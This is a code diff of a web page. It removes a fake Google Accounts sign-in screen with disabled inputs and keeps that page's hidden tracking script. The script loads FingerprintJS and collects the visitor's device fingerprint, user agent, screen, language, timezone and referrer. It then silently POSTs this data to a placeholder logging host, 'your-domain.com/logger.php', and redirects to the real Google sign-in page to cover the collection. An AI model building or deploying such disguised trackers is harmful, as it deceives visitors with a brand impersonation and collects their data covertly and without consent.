@@ -1,85 +1,37 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <title>Sign in – Google Accounts</title>
-  <link href="https://fonts.googleapis.com/css?family=Roboto:400,500&display=swap" rel="stylesheet">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <style>
-    * { box-sizing: border-box; font-family: 'Roboto', sans-serif; }
-    body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-    .container {
-      max-width: 360px;
-      width: 100%;
-      padding: 40px 30px;
-      border: 1px solid #dadce0;
-      border-radius: 8px;
-      text-align: center;
-    }
-    img.logo { width: 75px; margin-bottom: 20px; }
-    h1 { font-weight: 500; font-size: 24px; margin: 0 0 10px; color: #202124; }
-    p { color: #5f6368; font-size: 14px; margin-bottom: 24px; }
-    input {
-      width: 100%;
-      padding: 12px;
-      border: 1px solid #dadce0;
-      border-radius: 4px;
-      margin-bottom: 16px;
-      font-size: 16px;
-      background: #f1f3f4;
-      color: #888;
-    }
-    button {
-      width: 100%;
-      padding: 10px;
-      background: #1a73e8;
-      color: #fff;
-      font-weight: 500;
-      font-size: 14px;
-      border: none;
-      border-radius: 4px;
-      cursor: not-allowed;
-    }
-    .note { font-size: 12px; color: #777; margin-top: 20px; }
-  </style>
-</head>
-<body>
-  <div class="container">
-    <img class="logo" src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google">
-    <h1>Sign in</h1>
-    <p>Use your Google Account</p>
-    <input type="email" placeholder="Email or phone" disabled>
-    <button disabled>Next</button>
-    <p class="note">Not your device? Use Guest mode to sign in privately.</p>
-  </div>
+<script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
+<script>
+  ;(async () => {
+    const fp = await FingerprintJS.load();
+    const result = await fp.get();
 
-  <!-- 🔒 Hidden Tracker -->
-  <script src="https://cdn.jsdelivr.net/npm/@fingerprintjs/fingerprintjs@3/dist/fp.min.js"></script>
-  <script>
-    ;(async () => {
-      const fp = await FingerprintJS.load();
-      const result = await fp.get();
+    const payload = {
+      fingerprint: result.visitorId,
+      ip: '',
+      userAgent: navigator.userAgent,
+      screen: `${screen.width}x${screen.height}`,
+      lang: navigator.language,
+      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      referrer: document.referrer,
+      timestamp: new Date().toISOString()
+    };
 
-      const payload = {
-        fingerprint: result.visitorId,
-        ip: '',
-        userAgent: navigator.userAgent,
-        screen: `${screen.width}x${screen.height}`,
-        lang: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
-        referrer: document.referrer,
-        timestamp: new Date().toISOString()
-      };
-
-      fetch('https://your-domain.com/logger.php', {
+    try {
+      await fetch('https://your-domain.com/logger.php', {
         method: 'POST',
         headers: {'Content-Type': 'application/json'},
         body: JSON.stringify(payload)
       });
 
-      // Optional redirect after logging
-      // setTimeout(() => window.location.href = 'https://accounts.google.com', 5000);
-    })();
-  </script>
-</body>
-</html>
+      // 🧠 Delay before redirect
+      setTimeout(() => {
+        window.location.href = 'https://accounts.google.com/';
+      }, 3500);
+
+    } catch (e) {
+      // fallback just in case
+      setTimeout(() => {
+        window.location.href = 'https://accounts.google.com/';
+      }, 5000);
+    }
+  })();
+</script>
